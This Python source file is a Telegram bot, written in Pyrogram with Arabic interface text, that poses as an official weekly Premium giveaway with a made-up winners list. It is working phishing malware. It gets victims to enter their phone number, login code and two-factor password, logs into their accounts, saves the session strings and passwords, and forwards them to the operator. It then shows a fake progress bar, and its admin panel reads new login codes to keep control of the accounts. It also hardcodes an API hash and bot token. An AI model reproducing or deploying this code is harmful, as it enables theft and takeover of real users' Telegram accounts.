# -*- coding: utf-8 -*-

import asyncio
import sys

# ===== إصلاح مشكلة Python 3.10+ مع Pyrogram =====
if sys.version_info >= (3, 10):
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        try:
            asyncio.set_event_loop(asyncio.new_event_loop())
        except Exception:
            pass

import re
import time
import json
import os
import traceback

from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery, ForceReply, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

try:
    from pyrolistener import Listener, exceptions
    HAS_LISTENER = True
except ImportError:
    print("⚠️ pyrolistener غير مثبت")
    HAS_LISTENER = False
    exceptions = None

# ===== الإعدادات =====
API_ID = 22651991
API_HASH = "ecad214ecff6a5cd90fc141d4e32f597"
BOT_TOKEN = "6548223224:AAFEfcnAJnTmkIT0juK1hDCO-58zySHwgcw"
ADMIN_ID = 5485045996
ACCOUNTS_FILE = "accounts.json"

# ===== إنشاء البوت =====
try:
    app = Client("giftBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, workers=4)
    listener = Listener(client=app) if HAS_LISTENER else None
except Exception as e:
    print(f"❌ خطأ في إنشاء البوت: {e}")
    traceback.print_exc()
    sys.exit(1)

users_data = {}
user_cooldowns = {}
active_registrations = set()


# ===== إدارة الملفات =====
def load_accounts():
    global users_data
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                users_data = json.load(f)
        except Exception:
            users_data = {}
    else:
        users_data = {}


def save_accounts():
    try:
        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
            json.dump(users_data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"❌ خطأ في الحفظ: {e}")


def is_user_already_registered(user_id):
    for data in users_data.values():
        if data.get("user_id") == user_id:
            return True
    return False


# ===== الأزرار =====
USER_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎁 المطالبة بالهدية الأسبوعية", callback_data="claim_gift")],
    [InlineKeyboardButton("🏆 قائمة الفائزين هذا الأسبوع", callback_data="winners_list")],
    [InlineKeyboardButton("📜 شروط وأحكام المسابقة", callback_data="gift_rules")]
])

ADMIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("📋 إدارة الحسابات والتحكم", callback_data="overview")],
    [InlineKeyboardButton("🔄 تحديث فحص الحسابات", callback_data="refresh_overview")]
])


# ===== /start =====
@app.on_message(filters.command("start") & filters.private)
async def start(_, message: Message):
    user_id = message.from_user.id
    active_registrations.discard(user_id)

    if user_id == ADMIN_ID:
        await message.reply(
            "👑 **مرحباً بك في لوحة تحكم المالك**\n\n"
            "يمكنك من هنا متابعة الحسابات المسجلة وجلب أحدث الأكواد.",
            reply_markup=ADMIN_MENU
        )
    else:
        await message.reply(
            "🎁 **مرحباً بك في البوت الرسمي للسحب الأسبوعي!** 🥳\n\n"
            "شارك الآن في السحب الكبير لفرصة الفوز بـ **Telegram Premium لمدة سنة** أو جوائز مالية.\n\n"
            "👇 اضغط على زر **المطالبة بالهدية الأسبوعية** للبدء!",
            reply_markup=USER_MENU
        )


# ===== إلغاء التسجيل =====
@app.on_callback_query(filters.regex(r"^(cancel_reg)$"))
async def cancel_reg(_, callback: CallbackQuery):
    active_registrations.discard(callback.from_user.id)
    await callback.message.edit_text("❌ **تم إلغاء عملية التسجيل.**", reply_markup=USER_MENU)


# ===== قائمة الفائزين =====
@app.on_callback_query(filters.regex(r"^(winners_list)$"))
async def winners_list(_, callback: CallbackQuery):
    await callback.message.edit_text(
        "🏆 **قائمة الفائزين بالسحب الأسبوعي:**\n\n"
        "1. 🥇 @cttccctc 💳 **(100$ + Premium)**\n"
        "2. 🥈 @Hthonn ⭐️ **(Premium سنة)**\n"
        "3. 🥉 @ii00hh ⭐️ **(Premium سنة)**\n"
        "4. 🎗️ @oasow 🎁 **(بطاقة 50$)**\n"
        "5. 🎗️ @TheJackal28 ⭐️ **(Premium 3 أشهر)**\n"
        "6. 🎗️ @Speedy224 ⭐️ **(Premium 3 أشهر)**\n\n"
        "🎉 تهانينا للفائزين!",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_user")]])
    )


# ===== الشروط =====
@app.on_callback_query(filters.regex(r"^(gift_rules)$"))
async def gift_rules(_, callback: CallbackQuery):
    await callback.message.edit_text(
        "📜 **شروط وقوانين المشاركة:**\n\n"
        "1️⃣ أن يكون حساب التليجرام نِشطاً.\n"
        "2️⃣ يُسمح بالمشاركة مرة كل 3 دقائق.\n"
        "3️⃣ أدخل رمز التحقق بشكل صحيح.\n"
        "4️⃣ الفائزون يُختارون بشفافية.\n\n"
        "✨ **حظاً موفقاً!**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_user")]])
    )


@app.on_callback_query(filters.regex(r"^(back_user)$"))
async def back_user(_, callback: CallbackQuery):
    await callback.message.edit_text(
        "🎁 **البوت الرسمي للسحب الأسبوعي والهدايا**\n\nاختر من القائمة:",
        reply_markup=USER_MENU
    )


# ===== المطالبة بالهدية =====
@app.on_callback_query(filters.regex(r"^(claim_gift)$"))
async def claim_gift(_, callback: CallbackQuery):
    user_id = callback.from_user.id

    if user_id == ADMIN_ID:
        return await callback.answer("⚠️ أنت المالك.", show_alert=True)

    if is_user_already_registered(user_id):
        return await callback.answer("✅ مسجل مسبقاً!", show_alert=True)

    current_time = time.time()
    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 180:
            remaining = int(180 - elapsed)
            mins, secs = divmod(remaining, 60)
            return await callback.answer(f"⏳ انتظر {mins}د {secs}ث.", show_alert=True)

    await callback.message.delete()
    active_registrations.add(user_id)

    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="📲 **المرحلة الأولى: تأكيد هاتف المشارك**\n\n"
                 "أرسل رقم الهاتف المرتبط بحسابك على تليجرام.\n"
                 "*(مثال: `+9647700000000`)*:",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000000"),
            timeout=60
        )
    except exceptions.TimeOut:
        active_registrations.discard(user_id)
        return await app.send_message(user_id, "❌ نفد الوقت.", reply_markup=USER_MENU)

    if user_id not in active_registrations or ask.text == "/cancel":
        active_registrations.discard(user_id)
        return await ask.reply("❌ تم الإلغاء.", reply_markup=USER_MENU)

    asyncio.create_task(process_registration(ask))


# ===== معالجة التسجيل =====
async def process_registration(message: Message):
    user_id = message.from_user.id
    _number = message.text.strip().replace(" ", "")

    if not re.match(r"^\+\d{8,15}$", _number):
        active_registrations.discard(user_id)
        return await message.reply("❌ رقم غير صحيح.", reply_markup=USER_MENU)

    cancel_btn = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_reg")]])
    lmsg = await message.reply("⏳ **جارٍ إرسال كود التأكيد...**", reply_markup=cancel_btn)

    client = None
    try:
        client = Client(f"reg_{user_id}_{int(time.time())}", in_memory=True, api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        p_code_hash = await client.send_code(_number)

    except PhoneNumberInvalid:
        active_registrations.discard(user_id)
        if client:
            try: await client.disconnect()
            except: pass
        return await lmsg.edit_text("❌ رقم غير صحيح.", reply_markup=USER_MENU)

    except Exception as e:
        active_registrations.discard(user_id)
        if client:
            try: await client.disconnect()
            except: pass
        return await lmsg.edit_text(f"❌ خطأ: {str(e)[:100]}", reply_markup=USER_MENU)

    try:
        code = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="📥 **تم إرسال كود التأكيد.**\n\nأرسل الكود:",
            timeout=120,
            reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5")
        )
    except exceptions.TimeOut:
        active_registrations.discard(user_id)
        try: await client.disconnect()
        except: pass
        return await lmsg.reply("❌ نفد وقت الكود.", reply_markup=USER_MENU)

    if user_id not in active_registrations or code.text == "/cancel":
        active_registrations.discard(user_id)
        try: await client.disconnect()
        except: pass
        return await code.reply("❌ تم الإلغاء.", reply_markup=USER_MENU)

    password_text = "لا يوجد"
    try:
        clean_code = code.text.replace(" ", "").replace("-", "")
        await client.sign_in(_number, p_code_hash.phone_code_hash, clean_code)

    except PhoneCodeInvalid:
        active_registrations.discard(user_id)
        try: await client.disconnect()
        except: pass
        return await code.reply("❌ كود خاطئ.", reply_markup=USER_MENU)

    except PhoneCodeExpired:
        active_registrations.discard(user_id)
        try: await client.disconnect()
        except: pass
        return await code.reply("❌ الكود منتهي.", reply_markup=USER_MENU)

    except SessionPasswordNeeded:
        try:
            password = await listener.listen(
                from_id=user_id,
                chat_id=user_id,
                text="🔐 **الحساب محمي بـ 2FA.**\nأدخل كلمة المرور:",
                reply_markup=ForceReply(selective=True, placeholder="PASSWORD"),
                timeout=180
            )
        except exceptions.TimeOut:
            active_registrations.discard(user_id)
            try: await client.disconnect()
            except: pass
            return await lmsg.reply("❌ نفد الوقت.", reply_markup=USER_MENU)

        if user_id not in active_registrations or password.text == "/cancel":
            active_registrations.discard(user_id)
            try: await client.disconnect()
            except: pass
            return await password.reply("❌ تم الإلغاء.", reply_markup=USER_MENU)

        try:
            password_text = password.text.strip()
            await client.check_password(password_text)
        except PasswordHashInvalid:
            active_registrations.discard(user_id)
            try: await client.disconnect()
            except: pass
            return await password.reply("❌ كلمة المرور غير صحيحة.", reply_markup=USER_MENU)

    except Exception as e:
        active_registrations.discard(user_id)
        try: await client.disconnect()
        except: pass
        return await code.reply(f"❌ خطأ: {str(e)[:100]}", reply_markup=USER_MENU)

    try:
        session_string = await client.export_session_string()
        await client.disconnect()
    except Exception as e:
        active_registrations.discard(user_id)
        return await lmsg.reply(f"❌ خطأ في الجلسة: {e}", reply_markup=USER_MENU)

    users_data[_number] = {
        "user_id": user_id,
        "session": session_string,
        "password": password_text,
        "registered_at": time.time()
    }
    save_accounts()

    active_registrations.discard(user_id)
    user_cooldowns[user_id] = time.time()

    try:
        await app.send_message(
            ADMIN_ID,
            f"🎉 **تسجيل حساب جديد!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **الرقم:** `{_number}`\n"
            f"🔐 **2FA:** `{password_text}`\n"
            f"🔑 **الجلسة:** `{session_string[:80]}...`"
        )
    except Exception:
        pass

    progress_msg = await app.send_message(
        user_id,
        "🔄 **جاري الاتصال بخادم الهدايا...**\n"
        "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%"
    )

    statuses = [
        "⏳ جاري التحقق من نشاط الحساب...",
        "⏳ جاري فحص استحقاق Premium...",
        "⏳ جاري تخصيص الجائزة...",
        "⏳ جاري ربط الهدايا بحسابك...",
        "⏳ جاري إنهاء التوثيق..."
    ]

    total_seconds = 360
    update_interval = 6

    for current_sec in range(update_interval, total_seconds + 1, update_interval):
        await asyncio.sleep(update_interval)
        percent = int((current_sec / total_seconds) * 100)
        filled_blocks = int((percent / 100) * 15)
        bar = "█" * filled_blocks + "▒" * (15 - filled_blocks)
        remaining = total_seconds - current_sec
        mins, secs = divmod(remaining, 60)
        time_str = f"{mins:02d}:{secs:02d}"
        status_idx = min(percent // 21, len(statuses) - 1)

        try:
            await progress_msg.edit_text(
                f"🎁 **جاري معالجة الهدايا...**\n\n"
                f"{statuses[status_idx]}\n"
                f"⏱ المتبقي: `{time_str}`\n\n"
                f"[{bar}] **{percent}%**"
            )
        except Exception:
            pass

    await app.send_message(
        user_id,
        "✅ **تم تسجيل حسابك بنجاح!**\n\n🎉 أنت الآن ضمن قائمة المرشحين.",
        reply_markup=USER_MENU
    )


# ===== لوحة الأدمن =====
@app.on_callback_query(filters.regex(r"^(overview|refresh_overview)$"))
async def overview(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    if not users_data:
        return await callback.answer("⚠️ لا توجد حسابات.", show_alert=True)

    await callback.answer("🔄 جاري التحديث...")
    buttons = []

    for phone, details in users_data.items():
        sess = details.get("session")
        status = "🔴"
        try:
            chk = Client(f"chk_{int(time.time())}", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await chk.connect()
            if await chk.get_me():
                status = "🟢"
            await chk.disconnect()
        except Exception:
            status = "🔴"

        buttons.append([InlineKeyboardButton(f"{status} {phone}", callback_data=f"view_acc:{phone}")])

    buttons.append([InlineKeyboardButton("🔄 تحديث", callback_data="refresh_overview")])
    buttons.append([InlineKeyboardButton("🔙 الرئيسية", callback_data="admin_home")])

    await callback.message.edit_text(
        "📱 **قائمة الحسابات:**\n\nاضغط للتحكم:",
        reply_markup=InlineKeyboardMarkup(buttons)
    )


@app.on_callback_query(filters.regex(r"^(admin_home)$"))
async def admin_home(_, callback: CallbackQuery):
    if callback.from_user.id == ADMIN_ID:
        await callback.message.edit_text("👑 **لوحة المالك**", reply_markup=ADMIN_MENU)


@app.on_callback_query(filters.regex(r"^view_acc:(.+)"))
async def view_acc(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    phone = callback.data.split(":")[1]
    if phone in users_data:
        details = users_data[phone]
        pwd = details.get("password", "لا يوجد")
        text = f"📱 **الرقم:** `{phone}`\n🔐 **2FA:** `{pwd}`\n\nاضغط لجلب الكود:"
        buttons = [
            [InlineKeyboardButton("📩 جلب الكود", callback_data=f"get_code:{phone}")],
            [InlineKeyboardButton("🗑️ حذف", callback_data=f"del_acc:{phone}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="overview")]
        ]
        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))


@app.on_callback_query(filters.regex(r"^get_code:(.+)"))
async def get_code(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    phone = callback.data.split(":")[1]
    if phone not in users_data:
        return await callback.answer("غير موجود.", show_alert=True)

    await callback.answer("⏳ جاري القراءة...")
    sess = users_data[phone].get("session")

    try:
        acc_client = Client(f"gc_{int(time.time())}", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await acc_client.connect()

        latest_code = None
        full_message = ""
        async for msg in acc_client.get_chat_history(777000, limit=5):
            if msg.text:
                match = re.search(r"\b(\d{5,6})\b", msg.text)
                if match:
                    latest_code = match.group(1)
                    full_message = msg.text
                    break

        await acc_client.disconnect()

        if latest_code:
            await callback.message.edit_text(
                f"✅ **أحدث كود لـ `{phone}`:**\n\n"
                f"🔑 `{latest_code}`\n"
                f"🔐 2FA: `{users_data[phone].get('password', 'لا يوجد')}`\n\n"
                f"📄 `{full_message[:200]}`",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"view_acc:{phone}")]])
            )
        else:
            await callback.answer("❌ لا يوجد كود حديث.", show_alert=True)
    except Exception as e:
        await callback.answer(f"خطأ: {str(e)[:100]}", show_alert=True)


@app.on_callback_query(filters.regex(r"^del_acc:(.+)"))
async def del_acc(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    phone = callback.data.split(":")[1]
    if phone in users_data:
        del users_data[phone]
        save_accounts()
        await callback.message.edit_text(
            f"🗑️ تم حذف `{phone}`.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 القائمة", callback_data="overview")]])
        )


# ===== التشغيل =====
async def main():
    load_accounts()
    print("=" * 50)
    print("🤖 جاري بدء البوت...")
    print(f"🐍 Python: {sys.version.split()[0]}")
    print("=" * 50)

    try:
        await app.start()
        me = await app.get_me()
        print(f"✅ البوت شغال: @{me.username}")
        print(f"📊 الحسابات: {len(users_data)}")
        print("=" * 50)
        await asyncio.Event().wait()
    except Exception as e:
        print(f"❌ خطأ: {e}")
        traceback.print_exc()
    finally:
        try:
            await app.stop()
        except:
            pass


if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n⛔ تم الإيقاف")
    except Exception as e:
        print(f"❌ خطأ رئيسي: {e}")
        traceback.print_exc()
    finally:
        try:
            loop.close()
        except:
            pass
